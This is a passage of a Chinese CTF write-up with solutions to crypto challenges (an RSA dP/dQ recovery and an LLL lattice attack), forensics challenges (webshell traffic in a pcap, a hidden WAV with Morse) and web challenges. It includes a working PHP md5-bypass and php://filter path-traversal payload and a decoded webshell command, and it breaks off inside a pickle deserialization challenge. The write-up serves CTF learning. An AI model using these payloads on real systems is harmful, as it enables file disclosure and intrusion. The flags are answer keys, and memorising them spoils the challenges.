class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">alpha = p&#x27; * q&#x27; - l</span></span><br><span class="line"><span class="string">beta = l^2 * [(e * d - 1) / s] + q&#x27; * l + p&#x27; * l - p&#x27; * q&#x27; - alpha - l^2</span></span><br><span class="line"><span class="string">i.e.:</span></span><br><span class="line"><span class="string">beta = l^2 * &#123;[(e * d - 1) / s] - 1&#125; + l * (q&#x27; + p&#x27;) - alpha - p&#x27; * q&#x27;</span></span><br><span class="line"><span class="string">if l,s are correct:</span></span><br><span class="line"><span class="string">    alpha = k * t</span></span><br><span class="line"><span class="string">    beta = k * (p&#x27; - l) + t * (q&#x27; - l)</span></span><br><span class="line"><span class="string">i.e:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alpha_from_pprime_qprime_l</span>(<span class="params">pprime, qprime, l</span>):</span></span><br><span class="line">    <span class="keyword">return</span> pprime*qprime - l</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">beta_from_pprime_qprime_e_d_l_s_alpha</span>(<span class="params">pprime, qprime, e, d, l, s, alpha</span>):</span></span><br><span class="line">    temp1 = e*d - <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> temp1 % s == <span class="number">0</span></span><br><span class="line">    temp2 = ((temp1 // s) - <span class="number">1</span>) * l * l</span><br><span class="line">    temp3 = temp2 + l * (pprime + qprime)</span><br><span class="line">    <span class="keyword">return</span> temp3 - alpha - (pprime*qprime)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">k_t_from_pprime_qprime_l_alpha_beta</span>(<span class="params">pprime, qprime, l, alpha, beta</span>):</span></span><br><span class="line">    a = pprime - l</span><br><span class="line">    b = -beta</span><br><span class="line">    c = alpha * (qprime - l)</span><br><span class="line">    disc = b * b - <span class="number">4</span> * a * c</span><br><span class="line">    <span class="keyword">assert</span> gmpy2.is_square(disc)</span><br><span class="line">    temp = -b + gmpy2.isqrt(disc)</span><br><span class="line">    <span class="keyword">assert</span> temp % (<span class="number">2</span>*a) == <span class="number">0</span></span><br><span class="line">    k = temp // (<span class="number">2</span>*a) </span><br><span class="line">    <span class="keyword">assert</span> alpha % k == <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> k, alpha // k</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_k_t_l</span>(<span class="params">pprime, qprime, e, d</span>):</span></span><br><span class="line">    </span><br><span class="line">   <span class="comment"># l, s = 2, 2</span></span><br><span class="line"></span><br><span class="line">    ss = [s <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(e - <span class="number">100000</span>, e + <span class="number">1000000</span>) <span class="keyword">if</span> s!=<span class="number">0</span> <span class="keyword">and</span> (e*d - <span class="number">1</span>) % s == <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> l, s <span class="keyword">in</span> product(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5000</span>), ss):</span><br><span class="line">        <span class="comment">#print(f&#x27;l = &#123;l&#125;, s = &#123;s&#125;&#x27;)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            alpha = alpha_from_pprime_qprime_l(pprime, qprime, l)</span><br><span class="line">            beta = beta_from_pprime_qprime_e_d_l_s_alpha(pprime, qprime, e, d, l, s, alpha)</span><br><span class="line">            k, t = k_t_from_pprime_qprime_l_alpha_beta(pprime, qprime, l, alpha, beta)</span><br><span class="line">            <span class="keyword">return</span> k, t, l</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> AssertionError:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    fn = <span class="number">15743369066365201538689815141217340316571238013087670610561037355773525976258683589473338312326667266426637983360891507450086948913791067841805124377899989037485326133436719169246977060981737084689604571176180431464103979969894191079926052092838806338413905561857239072404009236751128582547515118141940600672935405990869984053032765764114050729270669601890847900632843688927485888918612911073502700067125045327489296133801029104137634700096205588495179191062622618039322093662364377472003903899926787818853067801269953347284657645644433840226628368651915623156258190141632506503179281547840336415021260912890513317032</span></span><br><span class="line">    d = gmpy2.invert(e,fn)</span><br><span class="line">    pprime = <span class="number">63567214271914333094632899333841375147292062018298573854142802911053572390920700513290025348818998146731407276513819782906243535938082361025317768375133584131695102997533625569063205757115454077033715745425720243515047860316309615090852448819151555625882308478246810599114349379924606314715907857949899701531</span></span><br><span class="line">    qprime = <span class="number">61854206698188431209560015384356189028981002413118973294450748821388080621667741484068895416821294105003859720045449073339567340407545907381482535347338180766054184558875014806879520058753821268699806496142714025634827191809185242495912563928024605815219672974396270176683304596115075405856328836048144151507</span></span><br><span class="line">    k, t, l = brute_k_t_l(pprime, qprime, e, d)</span><br><span class="line"></span><br><span class="line">    lp, lq = qprime + k, pprime + t</span><br><span class="line">    <span class="keyword">assert</span> lp % l == <span class="number">0</span>, lq % l == <span class="number">0</span></span><br><span class="line">    p, q = lp // l, lq // l</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">assert</span> gmpy2.invert(p, q) == pprime, gmpy2.invert(q, p) == qprime</span><br><span class="line">    <span class="keyword">assert</span> gmpy2.is_prime(p), gmpy2.is_prime(q)</span><br><span class="line">    N = p*q</span><br><span class="line"></span><br><span class="line">    c = <span class="number">13751833349374257546209411135285092025488474108950873335024549274321086737456294175321120539754112475192176856842163702158437261396059826784892899176923534179915888282864428402789707026830116675021571701648882970445289856088711084812757925707567230381940631064097247655097898810731114605714274641284534967275121251913986394408892187726203752249533094374744765243723455319272657285557501695073422223837888223589541537218910163081228251946239816318853757555291276404517545168694257378212616960758914005374587905274292014917325205163653897110709086078591016724234778570715311198272084303656971117931256882498414761066763</span></span><br><span class="line">    flag_decoded = <span class="built_in">pow</span>(c, d, N)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(flag_decoded))</span><br><span class="line">    </span><br><span class="line"><span class="comment">#b&#x27;flag&#123;dP_4nd_dQ_1s_4_exc1tlng_pr0bLEm&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>FLAG:</strong> <code>flag&#123;dP_4nd_dQ_1s_4_exc1tlng_pr0bLEm&#125;</code></p><p>​    </p><h3 id="FillTheBlank"><a href="#FillTheBlank" class="headerlink" title="FillTheBlank"></a>FillTheBlank</h3><blockquote><p>推公式？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">a = <span class="number">16358502146569154805821117102055792126075384391997576813810358118942744612520734385485210209088310766263140599554175000067735671573064419087690267925715334913530155481001158890983091873663077846204509925514040559562873128373049378251801304882824014436351821387973582562165652240535121822439156888350175610414618000437008389187928342072924670546637964062394868004556705496699646429981923137500855492623070913023804420063661041841121617920375160117028363526191248710373415720637387593795136212298387121644166224488964182846517612830649792045421886212347661276446680662471149305906153415890365792363053111611744767732723</span></span><br><span class="line">b = <span class="string">&quot;**********&quot;</span></span><br><span class="line">d = <span class="number">1004034638166310792730607806775703553124564601554345421260673</span></span><br><span class="line">flag=<span class="string">&quot;flag&#123;*************&#125;&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">z = <span class="string">&quot;**********&quot;</span></span><br><span class="line"></span><br><span class="line">rb = gmpy2.invert(b, p)  <span class="comment">#p应为a</span></span><br><span class="line">rd = gmpy2.invert(d, p)  <span class="comment">#p应为a</span></span><br><span class="line"></span><br><span class="line">x = rb*rd</span><br><span class="line">c = (m + z * rb * d % a)%a</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(x==<span class="number">6315659043002030386732628047413448608037014021450055783529151485037069834363316696715574624507364755209361330204858147422873261866250183596759294051863367248800298182067900158706847792801508096127972864438349393635089442050383307416911012903769591812354414290225858817653700560363386018244490076357373032578412217266586094695255045411910123500620718125148007865650934761243821251725823364164494857358344030633984045814182753879152597382860304163779884435644346012876829684180445183686922253767338719485395107909704323571278192414797079570675523716981179479127876875936828316228191746093521584500893126198631718691478</span>)</span><br><span class="line"><span class="keyword">assert</span>(c == <span class="number">13596888613593355909989922489890598098147006404940300566769884949973269155719149670825677093684865700611084990815597885910353735947129944271345041538903031681298587672182524580124290627382140539264797169742520543929318842181890234622629255911624719400312152476306595541663238469772749767491911131691767357337344670678126067823905376191196367985379783363614691429132347967869598160549130755596368301366502209859435570988428790501722994265227987470237460083210385323943246674820772425514186206511159274330451656105100385024137631498256411854720506611702496670593426888793357086314109878603547497784715623917384308274129</span>)</span><br><span class="line"><span class="keyword">assert</span>(log(d)/log(<span class="number">2</span>)&lt;=<span class="number">200</span>)</span><br><span class="line"><span class="keyword">assert</span>(log(z)/log(<span class="number">2</span>)&lt;=<span class="number">1024</span>)</span><br></pre></td></tr></table></figure></blockquote><p>推导：</p><p>由 $rb \equiv b^{-1} \pmod a$ 和 $rd \equiv d^{-1} \pmod a$ ，有 $rb \cdot b \cdot rd \cdot d = x \cdot b \cdot d \equiv 1 \pmod a$。</p><p>故求出 $b \equiv (x \cdot d)^{-1} \pmod a$，$rb \equiv b^{-1} \pmod a$。</p><p>又 $c = (m+z \cdot rb \cdot d) \bmod a$，构造格 $L=\begin{bmatrix} 1 &amp; rb \cdot d \\ 0 &amp; a \end{bmatrix}$，利用LLL算法求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">16358502146569154805821117102055792126075384391997576813810358118942744612520734385485210209088310766263140599554175000067735671573064419087690267925715334913530155481001158890983091873663077846204509925514040559562873128373049378251801304882824014436351821387973582562165652240535121822439156888350175610414618000437008389187928342072924670546637964062394868004556705496699646429981923137500855492623070913023804420063661041841121617920375160117028363526191248710373415720637387593795136212298387121644166224488964182846517612830649792045421886212347661276446680662471149305906153415890365792363053111611744767732723</span></span><br><span class="line">d = <span class="number">1004034638166310792730607806775703553124564601554345421260673</span></span><br><span class="line"></span><br><span class="line">x = <span class="number">6315659043002030386732628047413448608037014021450055783529151485037069834363316696715574624507364755209361330204858147422873261866250183596759294051863367248800298182067900158706847792801508096127972864438349393635089442050383307416911012903769591812354414290225858817653700560363386018244490076357373032578412217266586094695255045411910123500620718125148007865650934761243821251725823364164494857358344030633984045814182753879152597382860304163779884435644346012876829684180445183686922253767338719485395107909704323571278192414797079570675523716981179479127876875936828316228191746093521584500893126198631718691478</span></span><br><span class="line">c = <span class="number">13596888613593355909989922489890598098147006404940300566769884949973269155719149670825677093684865700611084990815597885910353735947129944271345041538903031681298587672182524580124290627382140539264797169742520543929318842181890234622629255911624719400312152476306595541663238469772749767491911131691767357337344670678126067823905376191196367985379783363614691429132347967869598160549130755596368301366502209859435570988428790501722994265227987470237460083210385323943246674820772425514186206511159274330451656105100385024137631498256411854720506611702496670593426888793357086314109878603547497784715623917384308274129</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">b = gmpy2.invert(x*d,a)</span><br><span class="line">rb = gmpy2.invert(b,a)</span><br><span class="line">rd = gmpy2.invert(d,a)</span><br><span class="line">h = rb*d%a</span><br><span class="line"></span><br><span class="line">p = a</span><br><span class="line"></span><br><span class="line">v1 = vector(ZZ, [<span class="number">1</span>, h])</span><br><span class="line">v2 = vector(ZZ, [<span class="number">0</span>, p])</span><br><span class="line">m = matrix([v1,v2]);</span><br><span class="line">f, g = m.LLL()[<span class="number">0</span>]</span><br><span class="line">f, g = -f, -g</span><br><span class="line"><span class="comment">#print(f, g)</span></span><br><span class="line"></span><br><span class="line">a = f*c % p % g</span><br><span class="line">m = a * inverse_mod(f, g) % g</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;flag&#123;we1c0mE_t0_cr4aK_mE!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>FLAG:</strong> <code>flag&#123;we1c0mE_t0_cr4aK_mE!&#125;</code></p><p>​    </p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><blockquote><p>flag{W3Lc0m3_t0_2o2I_3n3rgy_contest}</p></blockquote><p>签到。</p><p><strong>FLAG:</strong> <code>flag&#123;W3Lc0m3_t0_2o2I_3n3rgy_contest&#125;</code></p><p>​    </p><h3 id="hardwire-1"><a href="#hardwire-1" class="headerlink" title="hardwire_1"></a>hardwire_1</h3><blockquote><p>下载附件压缩包，分析文件，找到flag。提交flag格式：flag{xxxx}。</p></blockquote><p>流量包文件，wireshark打开，追踪TCP流，发现菜刀连接流量特征。</p><p>解析流1中<code>z2</code>参数值，base64解码得：</p><p><code>cd /d &quot;C:\php\htdocs&quot;&amp;winrar a -pf@l#ag102 key.rar key.jpg&amp;echo [S]&amp;cd&amp;echo [E]</code></p><p>解析流3中<code>z0</code>参数值，base64解码转存得到Rar文件 <code>key.rar</code>。</p><p>结合前面的解压密码 <code>f@l#ag102</code>，解压得到 flag.jpg。</p><p><strong>FLAG:</strong> <code>flag&#123;579a4da9e3375c9b96add11cf2915eb5&#125;</code></p><p>​    </p><h3 id="wava"><a href="#wava" class="headerlink" title="wava"></a>wava</h3><blockquote><p>Do you know what is wava?</p></blockquote><p>附件move.zip无法打开，010editor查看为wav文件头，修改后缀，使用audacity打开未发现有用信息。</p><p>回到16进制下查看，发现在0x69处存在另一个wav文件头，删除前面的文件头保存，重新使用audacity打开，发现摩斯密码，手撸下来得到：</p><p><code>..-. .-.. .- --. ----- ....- -.. .---- -.. . -.... -.. -.... ...-- .- .- .---- -... ..... -... ..... ..... --... ...-- ..-. -.-. -.... . ----- ---.. . ...-- ----. -.... ..-. -----</code></p><p>解码得flag。</p><p><strong>FLAG:</strong> <code>flag&#123;04d1de6d63aa1b5b5573fc6e08e396f0&#125;</code></p><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><blockquote><p>想看二次元有很多障碍(flag在/flag)</p></blockquote><p>点提交按钮出现源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;site&#x27;</span>])&#123; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">想看个二次元怎么这么难</span><br><span class="line">&lt;form action=<span class="string">&#x27;&#x27;</span> method=<span class="string">&#x27;GET&#x27;</span>&gt; </span><br><span class="line">&lt;input type=<span class="string">&#x27;submit&#x27;</span> name=<span class="string">&#x27;submit&#x27;</span> /&gt; </span><br><span class="line">&lt;input type=<span class="string">&#x27;text&#x27;</span> name=<span class="string">&#x27;site&#x27;</span> style=<span class="string">&quot;width:1000px&quot;</span> value=<span class="string">&quot;https://bilibili.com/&quot;</span>/&gt; </span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt; </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]===<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])||(md5(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>])!=md5(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))) <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;site&#x27;</span>]; </span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line"><span class="variable">$url_schema</span> = parse_url(<span class="variable">$url</span>); </span><br><span class="line"><span class="variable">$host</span> = <span class="variable">$url_schema</span>[<span class="string">&#x27;host&#x27;</span>]; </span><br><span class="line"><span class="variable">$request_url</span> = <span class="variable">$url</span>.<span class="string">&quot;/v/popular/all&quot;</span>.<span class="variable">$path</span>; </span><br><span class="line"><span class="variable">$res</span> = file_get_contents(<span class="variable">$request_url</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strstr(<span class="variable">$res</span>,<span class="string">&quot;flag&quot;</span>)) <span class="keyword">die</span>(<span class="string">&quot;you can&#x27;t see my flag&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$res</span>)&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Source Code:&lt;/h1&gt;&quot;</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$request_url</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;hr /&gt;&quot;</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$res</span>; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;get source failed&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一层，PHP md5弱比较性质绕过：<code>user[]=1&amp;password[]=2</code></p><p>第二层，PHP伪协议拼接绕过关键词+目录穿越：<code>site=php://filter/read=convert.base64-encode/resource=ss&amp;path=/../../../../../../../../../flag</code></p><p>payload:</p><p><code>?submit=%E6%8F%90%E4%BA%A4&amp;site=php://filter/read=convert.base64-encode/resource=ss&amp;path=/../../../../../../../../../flag&amp;user[]=1&amp;password[]=2</code></p><p>得到<code>ZmxhZ3tqWkV0NkNrRmNSOFNHbVBCTjJobDVvcjBYVzRUM251TX0K</code>，base64解码得flag。</p><p><strong>FLAG:</strong> <code>flag&#123;jZEt6CkFcR8SGmPBN2hl5or0XW4T3nuM&#125;</code></p><p>​    </p><h3 id="EZpy"><a href="#EZpy" class="headerlink" title="EZpy"></a>EZpy</h3><blockquote><p>pickle反序列化</p></blockquote><p>加参数 <code>?source=1</code> 得到源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> b</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, render_template, request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">filename, encoding=<span class="string">&#x27;utf-8&#x27;</span></span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>, encoding=encoding) <span class="keyword">as</span> fin:</span><br><span class="line">        <span class="keyword">return</span> fin.read()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">people</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, sex, age</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.sex = sex</span><br><span class="line">        self.age=age</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;people(name=<span class="subst">&#123;self.name!r&#125;</span>, category=<span class="subst">&#123;self.sex!r&#125;</span>, age=<span class="subst">&#123;self.age!r&#125;</span>)&#x27;</span></span><br><span class="line">    <span class="comment">#==判断</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span>(<span class="params">self, other</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(other) <span class="keyword">is</span>  people <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.sex == other.sex <span class="keyword">and</span> self.age==other.age</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> module[<span class="number">0</span>:<span class="number">8</span>] == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[<span class="string">&#x27;__main__&#x27;</span>], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">here_load</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;source&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> Response(read(__file__),mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">&quot;/?source=&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/app&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inll</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pickle_data = request.form.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> base64.b64decode(pickle_data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;no no no&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = here_load(base64.b64decode(pickle_data))</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">type</span>(result) <span class="keyword">is</span> <span class="keyword">not</span> people:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;？？？？&#x27;</span></span><br><span class="line">            correct = (result == people(b.name, b.sex, b.age))</span><br><span class="line">            <span class="keyword">if</span> correct:</span><br><span class="line">                <span class="keyword">return</span> Response(read(<span class="string">&#x27;/flag.txt&#x27;</span>))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> Response(<span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line">    test = people(<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;55&#x27;</span>)</span><br><span class="line">    pickle_data = base64.b64encode(pickle.dumps(test)).decode()</span><br><span class="line">    <span class="keyword">return</span> Response(pickle_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span 